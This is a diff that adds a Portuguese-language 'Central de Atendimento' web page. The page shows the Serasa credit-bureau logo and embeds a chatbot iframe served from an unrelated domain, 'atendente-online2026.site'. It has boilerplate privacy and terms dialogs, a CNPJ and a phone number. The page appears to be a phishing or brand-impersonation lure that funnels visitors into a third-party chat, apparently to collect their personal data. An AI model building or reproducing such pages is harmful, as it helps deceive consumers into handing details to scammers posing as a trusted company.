@@ -1,0 +1,142 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="color-scheme" content="light">
+  <title>Central • Atendimento</title>
+  <meta name="description" content="Atendimento online seguro e simplificado.">
+  <link rel="stylesheet" href="/public/css/style.css">
+</head>
+<body>
+  <header class="topbar">
+    <div class="nav">
+      <a href="/" class="brand">
+        <img src="https://logodownload.org/wp-content/uploads/2017/09/serasa-logo-1.png" alt="Ir para página inicial" title="Ir para página inicial" class="brand-logo">
+      </a>
+    </div>
+  </header>
+
+  <main class="hero">
+    <div class="shell">
+      <div class="page-header">
+        <h1>Central de Atendimento</h1>
+        <p>Atendimento online seguro e simplificado. Nossa equipe está pronta para ajudar você.</p>
+      </div>
+
+      <section class="card" aria-label="Atendimento">
+        <div class="card-head">
+          <div class="card-title">Atendimento Online</div>
+        </div>
+        <div class="iframe-wrap">
+          <iframe
+          src="https://type.atendente-online2026.site/srs-seunomeok"
+        style="border: none; width: 100%; height: 100%; background: #ffffff !important;"
+        ></iframe>
+        </div>
+      </section>
+    </div>
+  </main>
+
+  <footer>
+    <div class="foot">
+      <div class="foot-main">
+        <div class="foot-brand-section">
+          <img src="https://logodownload.org/wp-content/uploads/2017/09/serasa-logo-1.png" alt="Serasa" class="foot-logo">
+        </div>
+        <div class="foot-links-section">
+          <a href="#" id="btn-priv">Política de Privacidade</a>
+          <a href="#" id="btn-termos">Termos de Uso</a>
+          <a href="#" id="btn-mais">Saiba Mais</a>
+        </div>
+      </div>
+      <div class="foot-bottom">
+        <p>© <span id="y">2025</span> Central — Todos os direitos reservados.</p>
+        <p class="foot-registry">CNPJ: 62.173.620/0001-80</p>
+      </div>
+    </div>
+  </footer>
+
+  <dialog id="dlg-priv">
+    <div class="modal-head">
+      <div>Política de Privacidade</div>
+      <button class="btn-close" onclick="document.getElementById('dlg-priv').close()">✕</button>
+    </div>
+    <div class="modal-body">
+      <p>Coletamos e tratamos dados pessoais exclusivamente para prestar o atendimento solicitado. As informações são utilizadas apenas para identificar seu atendimento e responder suas solicitações.</p>
+      <p>Você pode solicitar a exclusão dos seus dados a qualquer momento através dos nossos canais de atendimento.</p>
+      <div class="contact-info">
+        <strong>Central de Atendimento ao Consumidor</strong><br>
+        <span>3003-6300</span>
+      </div>
+      <small>Última atualização: <span id="d1">29/12/2025</span></small>
+    </div>
+  </dialog>
+
+  <dialog id="dlg-termos">
+    <div class="modal-head">
+      <div>Termos de Uso</div>
+      <button class="btn-close" onclick="document.getElementById('dlg-termos').close()">✕</button>
+    </div>
+    <div class="modal-body">
+      <p>Ao utilizar este site, você concorda em seguir estes Termos de Uso. O conteúdo tem caráter informativo e não substitui orientações de órgãos oficiais.</p>
+      <p>Os serviços oferecidos são de suporte e orientação. Não representamos entidades públicas nem intermediamos decisões governamentais.</p>
+      <p>É proibida a utilização para fins ilícitos, envio de spam ou tentativa de fraude.</p>
+      <div class="contact-info">
+        <strong>Central de Atendimento ao Consumidor</strong><br>
+        <span>3003-6300</span>
+      </div>
+      <small>Última atualização: <span id="d2">29/12/2025</span></small>
+    </div>
+  </dialog>
+
+  <dialog id="dlg-mais">
+    <div class="modal-head">
+      <div>Mais Informações</div>
+      <button class="btn-close" onclick="document.getElementById('dlg-mais').close()">✕</button>
+    </div>
+    <div class="modal-body">
+      <p>Esta plataforma oferece atendimento online seguro e simplificado. Para dúvidas ou suporte, entre em contato através dos nossos canais oficiais.</p>
+      <div class="contact-info">
+        <strong>Central de Atendimento ao Consumidor</strong><br>
+        <span>3003-6300</span>
+      </div>
+      <small>Última atualização: <span id="d3">29/12/2025</span></small>
+    </div>
+  </dialog>
+
+  <script src="/public/js/main.js"></script>
+  <script>
+    // Tentar forçar fundo branco no typebot após carregar
+    document.addEventListener('DOMContentLoaded', function() {
+      const iframe = document.getElementById('typebot-iframe');
+      if (iframe) {
+        iframe.onload = function() {
+          try {
+            // Tentar acessar o conteúdo do iframe (só funciona se for mesmo domínio)
+            const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
+            if (iframeDoc) {
+              iframeDoc.body.style.backgroundColor = '#ffffff';
+              iframeDoc.documentElement.style.backgroundColor = '#ffffff';
+              // Tentar modificar elementos do typebot
+              const typebotContainer = iframeDoc.querySelector('.typebot-chat-view');
+              if (typebotContainer) {
+                typebotContainer.style.backgroundColor = '#ffffff';
+              }
+              const scrollableContainer = iframeDoc.querySelector('.scrollable-container');
+              if (scrollableContainer) {
+                scrollableContainer.style.backgroundColor = '#ffffff';
+              }
+            }
+          } catch (e) {
+            // Cross-origin, não podemos modificar diretamente
+            console.log('Typebot carregado (cross-origin, não é possível modificar CSS)');
+          }
+        };
+      }
+    });
+  </script>
+  <script>'undefined'=== typeof _trfq || (window._trfq = []);'undefined'=== typeof _trfd && (window._trfd=[]),_trfd.push({'tccl.baseHost':'secureserver.net'},{'ap':'cpsh-oh'},{'server':'p3plzcpnl509583'},{'dcenter':'p3'},{'cp_id':'10740190'},{'cp_cl':'8'}) // Monitoring performance to make your website faster. If you want to opt-out, please contact web hosting support.</script>
+</body>
+</html>
+
